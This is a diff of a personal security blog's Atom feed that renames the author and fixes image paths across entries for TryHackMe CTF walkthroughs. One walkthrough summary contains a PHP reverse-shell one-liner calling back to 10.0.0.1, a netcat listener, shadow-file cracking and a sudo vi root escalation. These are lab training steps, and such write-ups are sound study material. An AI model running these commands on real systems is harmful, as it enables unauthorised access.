@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-11-02T04:29:51+00:00</updated><id>/feed.xml</id><title type="html">Blog</title><subtitle>Saharsh Agrawal</subtitle><author><name>GitHub User</name></author><entry><title type="html">Advent Of Cyber 3 (2021)</title><link href="/CTF/adventofcyber3/" rel="alternate" type="text/html" title="Advent Of Cyber 3 (2021)" /><published>2021-12-01T00:00:00+00:00</published><updated>2021-12-01T00:00:00+00:00</updated><id>/CTF/Advent-of-Cyber-3-(2021)</id><content type="html" xml:base="/CTF/adventofcyber3/"><![CDATA[]]></content><author><name>GitHub User</name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">ColddBox:Easy WalkThrough</title><link href="/CTF/colddbox" rel="alternate" type="text/html" title="ColddBox:Easy WalkThrough" /><published>2021-05-18T00:00:00+00:00</published><updated>2021-05-18T00:00:00+00:00</updated><id>/CTF/colddbox</id><content type="html" xml:base="/CTF/colddbox"><![CDATA[<h1 id="colddboxeasy">ColddBox:Easy</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-11-02T14:50:29+00:00</updated><id>/feed.xml</id><title type="html">Saharsh Agrawal</title><subtitle>Security Researcher, Threat Intelligence analyst and penetration tester. Write-ups on CTFs, CVE research and malware campaigns.</subtitle><author><name>Saharsh Agrawal</name></author><entry><title type="html">Advent of Cyber 3 (2021)</title><link href="/CTF/adventofcyber3/" rel="alternate" type="text/html" title="Advent of Cyber 3 (2021)" /><published>2021-12-01T00:00:00+00:00</published><updated>2021-12-01T00:00:00+00:00</updated><id>/CTF/Advent-of-Cyber-3-(2021)</id><content type="html" xml:base="/CTF/adventofcyber3/"><![CDATA[]]></content><author><name>Saharsh Agrawal</name></author><summary type="html"><![CDATA[Get started with cyber security in 25 days — a beginner friendly challenge every day leading up to Christmas.]]></summary></entry><entry><title type="html">ColddBox:Easy WalkThrough</title><link href="/CTF/colddbox" rel="alternate" type="text/html" title="ColddBox:Easy WalkThrough" /><published>2021-05-18T00:00:00+00:00</published><updated>2021-05-18T00:00:00+00:00</updated><id>/CTF/colddbox</id><content type="html" xml:base="/CTF/colddbox"><![CDATA[<h1 id="colddboxeasy">ColddBox:Easy</h1>
 <h1><img src="/images/coldd/front.png" alt="front" /></h1>
 <p><a href="https://tryhackme.com/room/colddboxeasy">https://tryhackme.com/room/colddboxeasy</a></p>
 
@@ -47,7 +47,7 @@
 <p><img src="/images/coldd/uflag.png" alt="uf" /></p>
 
 <h2 id="root-flag">Root Flag:</h2>
-<p><img src="/images/coldd/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[ColddBox:Easy https://tryhackme.com/room/colddboxeasy]]></summary></entry><entry><title type="html">Overpass WalkThrough</title><link href="/CTF/overpass" rel="alternate" type="text/html" title="Overpass WalkThrough" /><published>2021-05-15T00:00:00+00:00</published><updated>2021-05-15T00:00:00+00:00</updated><id>/CTF/overpass</id><content type="html" xml:base="/CTF/overpass"><![CDATA[<h1 id="overpass">Overpass</h1>
+<p><img src="/images/coldd/root.png" alt="root" /></p>]]></content><author><name>Saharsh Agrawal</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[ColddBox:Easy https://tryhackme.com/room/colddboxeasy]]></summary></entry><entry><title type="html">Overpass WalkThrough</title><link href="/CTF/overpass" rel="alternate" type="text/html" title="Overpass WalkThrough" /><published>2021-05-15T00:00:00+00:00</published><updated>2021-05-15T00:00:00+00:00</updated><id>/CTF/overpass</id><content type="html" xml:base="/CTF/overpass"><![CDATA[<h1 id="overpass">Overpass</h1>
 <p><img src="/images/overpass/front.png" alt="front" />
 <a href="https://tryhackme.com/room/overpass">https://tryhackme.com/room/overpass</a></p>
 
@@ -141,7 +141,7 @@
 </ul>
 
 <h3 id="root-flag">Root Flag:</h3>
-<p><img src="/images/overpass/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Overpass https://tryhackme.com/room/overpass Open ports: - 22: SSH - 80: HTTP ![ports](/images/overpass/ports.png)]]></summary></entry><entry><title type="html">Charlie and The Chocolate Factory CTF WalkThrough</title><link href="/CTF/chocolate" rel="alternate" type="text/html" title="Charlie and The Chocolate Factory CTF WalkThrough" /><published>2021-01-17T00:00:00+00:00</published><updated>2021-01-17T00:00:00+00:00</updated><id>/CTF/Chocolate-factory-ctf</id><content type="html" xml:base="/CTF/chocolate"><![CDATA[<h1 id="charlie-and-the-chocolate-factory">Charlie and the Chocolate Factory</h1>
+<p><img src="/images/overpass/root.png" alt="root" /></p>]]></content><author><name>Saharsh Agrawal</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Overpass https://tryhackme.com/room/overpass Open ports: - 22: SSH - 80: HTTP ![ports](/images/overpass/ports.png)]]></summary></entry><entry><title type="html">Charlie and The Chocolate Factory CTF WalkThrough</title><link href="/CTF/chocolate" rel="alternate" type="text/html" title="Charlie and The Chocolate Factory CTF WalkThrough" /><published>2021-01-17T00:00:00+00:00</published><updated>2021-01-17T00:00:00+00:00</updated><id>/CTF/Chocolate-factory-ctf</id><content type="html" xml:base="/CTF/chocolate"><![CDATA[<h1 id="charlie-and-the-chocolate-factory">Charlie and the Chocolate Factory</h1>
 <h1><img src="/images/chocolate/banner.png" alt="front" /></h1>
 <p><a href="https://tryhackme.com/room/chocolatefactory">https://tryhackme.com/room/chocolatefactory</a></p>
 
@@ -233,7 +233,7 @@ ssh -i teleport charlie@ip
 </code></pre></div>    </div>
   </li>
   <li>Enter the key found after reversing</li>
-</ul>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Charlie and the Chocolate Factory https://tryhackme.com/room/chocolatefactory Open Ports: nmap $IP netcat netcat to all prots from 100 - 125 nc $IP 100 nc $IP 113 found a link in port 113 : http://localhost/key_rev_key found a key file in link Revers engineering the file strings key Ftp Anonymous login found an image get gumroom.jpg extract the image steghide extarct -sf gumroom.jpg found b64.txt which has base64 encoded text decoding the text user password shadow file found crack the shadow file usig johnny Port 80 Enter the username: charlie Enter the password found after cracking : cn7824 After login found a bar that executes os commands Gaining reverse shell php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' start listner nc -lvnp 1234 Now you have the access to the machine go to /home/charlie You will find teleport file which is a id_rsa file(ssh-key) copy the contents of the file to host machine change the permission of the teleport file in the host machine chmod 600 teleport ssh -i teleport charlie@ip Port 22 cd /home/charlie cat uesr.txt see the permissions you have sudo -l permission to run vi as sudo sudo vi -c '!/bin/bash' now you are root root go to /root python root.py Enter the key found after reversing]]></summary></entry><entry><title type="html">Kenobi WalkThrough</title><link href="/CTF/kenobi" rel="alternate" type="text/html" title="Kenobi WalkThrough" /><published>2020-07-04T00:00:00+00:00</published><updated>2020-07-04T00:00:00+00:00</updated><id>/CTF/kenobi</id><content type="html" xml:base="/CTF/kenobi"><![CDATA[<h1 id="anonymouos">Anonymouos</h1>
+</ul>]]></content><author><name>Saharsh Agrawal</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Charlie and the Chocolate Factory https://tryhackme.com/room/chocolatefactory Open Ports: nmap $IP netcat netcat to all prots from 100 - 125 nc $IP 100 nc $IP 113 found a link in port 113 : http://localhost/key_rev_key found a key file in link Revers engineering the file strings key Ftp Anonymous login found an image get gumroom.jpg extract the image steghide extarct -sf gumroom.jpg found b64.txt which has base64 encoded text decoding the text user password shadow file found crack the shadow file usig johnny Port 80 Enter the username: charlie Enter the password found after cracking : cn7824 After login found a bar that executes os commands Gaining reverse shell php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' start listner nc -lvnp 1234 Now you have the access to the machine go to /home/charlie You will find teleport file which is a id_rsa file(ssh-key) copy the contents of the file to host machine change the permission of the teleport file in the host machine chmod 600 teleport ssh -i teleport charlie@ip Port 22 cd /home/charlie cat uesr.txt see the permissions you have sudo -l permission to run vi as sudo sudo vi -c '!/bin/bash' now you are root root go to /root python root.py Enter the key found after reversing]]></summary></entry><entry><title type="html">Kenobi WalkThrough</title><link href="/CTF/kenobi" rel="alternate" type="text/html" title="Kenobi WalkThrough" /><published>2020-07-04T00:00:00+00:00</published><updated>2020-07-04T00:00:00+00:00</updated><id>/CTF/kenobi</id><content type="html" xml:base="/CTF/kenobi"><![CDATA[<h1 id="anonymouos">Anonymouos</h1>
 <h1><img src="/images/kenobi/front.png" alt="front" /></h1>
 <p><a href="https://tryhackme.com/room/kenobi">https://tryhackme.com/room/kenobi</a>
 <img src="/images/kenobi/img.gif" height="90px" /></p>
@@ -295,8 +295,8 @@ ssh -i teleport charlie@ip
 </ol>
 
 <h3 id="root-flag">Root Flag:</h3>
-<p><img src="/images/kenobi/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Anonymouos https://tryhackme.com/room/kenobi]]></summary></entry><entry><title type="html">Anonymous WalkThrough</title><link href="/CTF/anonymous" rel="alternate" type="text/html" title="Anonymous WalkThrough" /><published>2020-06-29T00:00:00+00:00</published><updated>2020-06-29T00:00:00+00:00</updated><id>/CTF/anonymous</id><content type="html" xml:base="/CTF/anonymous"><![CDATA[<h1 id="anonymouos">Anonymouos</h1>
-<h1><img src="/images/Anonymous/front.png" alt="front" /></h1>
+<p><img src="/images/kenobi/root.png" alt="root" /></p>]]></content><author><name>Saharsh Agrawal</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Anonymouos https://tryhackme.com/room/kenobi]]></summary></entry><entry><title type="html">Anonymous WalkThrough</title><link href="/CTF/anonymous" rel="alternate" type="text/html" title="Anonymous WalkThrough" /><published>2020-06-29T00:00:00+00:00</published><updated>2020-06-29T00:00:00+00:00</updated><id>/CTF/anonymous</id><content type="html" xml:base="/CTF/anonymous"><![CDATA[<h1 id="anonymouos">Anonymouos</h1>
+<h1><img src="/images/anonymous/front.png" alt="front" /></h1>
 <p><a href="https://tryhackme.com/room/anonymous">https://tryhackme.com/room/anonymous</a></p>
 
 <h2 id="open-ports">Open Ports:</h2>
@@ -307,7 +307,7 @@ ssh -i teleport charlie@ip
   <li>445: MICROSOFT-DS</li>
 </ul>
 
-<p><img src="/images/Anonymous/ports.png" alt="ports" /></p>
+<p><img src="/images/anonymous/ports.png" alt="ports" /></p>
 
 <h2 id="gaining-access">Gaining Access:</h2>
 <ol>
@@ -330,7 +330,7 @@ ssh -i teleport charlie@ip
 </ul>
 
 <h3 id="root-flag">Root Flag:</h3>
-<p><img src="/images/Anonymous/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Anonymouos https://tryhackme.com/room/anonymous]]></summary></entry><entry><title type="html">CMesS WalkThrough</title><link href="/CTF/cmess" rel="alternate" type="text/html" title="CMesS WalkThrough" /><published>2020-06-27T00:00:00+00:00</published><updated>2020-06-27T00:00:00+00:00</updated><id>/CTF/cmess</id><content type="html" xml:base="/CTF/cmess"><![CDATA[<h1 id="cmess">CMesS</h1>
+<p><img src="/images/anonymous/root.png" alt="root" /></p>]]></content><author><name>Saharsh Agrawal</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Anonymouos https://tryhackme.com/room/anonymous]]></summary></entry><entry><title type="html">CMesS WalkThrough</title><link href="/CTF/cmess" rel="alternate" type="text/html" title="CMesS WalkThrough" /><published>2020-06-27T00:00:00+00:00</published><updated>2020-06-27T00:00:00+00:00</updated><id>/CTF/cmess</id><content type="html" xml:base="/CTF/cmess"><![CDATA[<h1 id="cmess">CMesS</h1>
 <h1><img src="/images/cmess/front.png" alt="front" /></h1>
 <p><a href="https://tryhackme.com/room/cmess">https://tryhackme.com/room/cmess</a></p>
 
@@ -387,7 +387,7 @@ Chmod +x  shell.sh
 </ul>
 
 <h3 id="root-flag">ROOT Flag:</h3>
-<p><img src="/images/cmess/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[CMesS https://tryhackme.com/room/cmess]]></summary></entry><entry><title type="html">Simple CTF WalkThrough</title><link href="/CTF/simplectf" rel="alternate" type="text/html" title="Simple CTF WalkThrough" /><published>2020-06-26T00:00:00+00:00</published><updated>2020-06-26T00:00:00+00:00</updated><id>/CTF/simple-CTF</id><content type="html" xml:base="/CTF/simplectf"><![CDATA[<h1 id="simple-ctf">Simple CTF</h1>
+<p><img src="/images/cmess/root.png" alt="root" /></p>]]></content><author><name>Saharsh Agrawal</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[CMesS https://tryhackme.com/room/cmess]]></summary></entry><entry><title type="html">Simple CTF WalkThrough</title><link href="/CTF/simplectf" rel="alternate" type="text/html" title="Simple CTF WalkThrough" /><published>2020-06-26T00:00:00+00:00</published><updated>2020-06-26T00:00:00+00:00</updated><id>/CTF/simple-CTF</id><content type="html" xml:base="/CTF/simplectf"><![CDATA[<h1 id="simple-ctf">Simple CTF</h1>
 <h1><img src="/images/simplectf/front.png" alt="front" /></h1>
 <p><a href="https://tryhackme.com/room/easyctf">https://tryhackme.com/room/easyctf</a></p>
 
@@ -424,7 +424,7 @@ Chmod +x  shell.sh
 <p><img src="/images/simplectf/sudo.png" alt="sudo" /></p>
 
 <h3 id="root-flag">Root Flag:</h3>
-<p><img src="/images/simplectf/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Simple CTF https://tryhackme.com/room/easyctf]]></summary></entry><entry><title type="html">Vulnversity WalkThrough</title><link href="/CTF/vulnversity" rel="alternate" type="text/html" title="Vulnversity WalkThrough" /><published>2020-06-26T00:00:00+00:00</published><updated>2020-06-26T00:00:00+00:00</updated><id>/CTF/vulnversity</id><content type="html" xml:base="/CTF/vulnversity"><![CDATA[<h1 id="vulnversity">Vulnversity</h1>
+<p><img src="/images/simplectf/root.png" alt="root" /></p>]]></content><author><name>Saharsh Agrawal</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Simple CTF https://tryhackme.com/room/easyctf]]></summary></entry><entry><title type="html">Vulnversity WalkThrough</title><link href="/CTF/vulnversity" rel="alternate" type="text/html" title="Vulnversity WalkThrough" /><published>2020-06-26T00:00:00+00:00</published><updated>2020-06-26T00:00:00+00:00</updated><id>/CTF/vulnversity</id><content type="html" xml:base="/CTF/vulnversity"><![CDATA[<h1 id="vulnversity">Vulnversity</h1>
 <h1><img src="/images/vulnversity/front.png" alt="front" /></h1>
 <p><a href="https://tryhackme.com/room/vulnversity">https://tryhackme.com/room/vulnversity</a></p>
 
@@ -472,7 +472,7 @@ Chmod +x  shell.sh
 </ul>
 
 <h3 id="root-flag">Root Flag:</h3>
-<p><img src="/images/vulnversity/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Vulnversity https://tryhackme.com/room/vulnversity]]></summary></entry><entry><title type="html">Anthem WalkThrough</title><link href="/CTF/anthem" rel="alternate" type="text/html" title="Anthem WalkThrough" /><published>2020-06-20T00:00:00+00:00</published><updated>2020-06-20T00:00:00+00:00</updated><id>/CTF/anthem</id><content type="html" xml:base="/CTF/anthem"><![CDATA[<h1 id="anthem">Anthem</h1>
+<p><img src="/images/vulnversity/root.png" alt="root" /></p>]]></content><author><name>Saharsh Agrawal</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Vulnversity https://tryhackme.com/room/vulnversity]]></summary></entry><entry><title type="html">Anthem WalkThrough</title><link href="/CTF/anthem" rel="alternate" type="text/html" title="Anthem WalkThrough" /><published>2020-06-20T00:00:00+00:00</published><updated>2020-06-20T00:00:00+00:00</updated><id>/CTF/anthem</id><content type="html" xml:base="/CTF/anthem"><![CDATA[<h1 id="anthem">Anthem</h1>
 <p><img src="/images/anthem/front.png" alt="front" />
 <a href="https://tryhackme.com/room/anthem">https://tryhackme.com/room/anthem</a></p>
 
@@ -533,4 +533,4 @@ Chmod +x  shell.sh
  <img src="/images/anthem/3rd.png" alt="3rd" /></li>
   <li>4th flag:
  <img src="/images/anthem/4th.png" alt="4th" /></li>
-</ol>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Anthem https://tryhackme.com/room/anthem]]></summary></entry></feed>
+</ol>]]></content><author><name>Saharsh Agrawal</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Anthem https://tryhackme.com/room/anthem]]></summary></entry></feed>
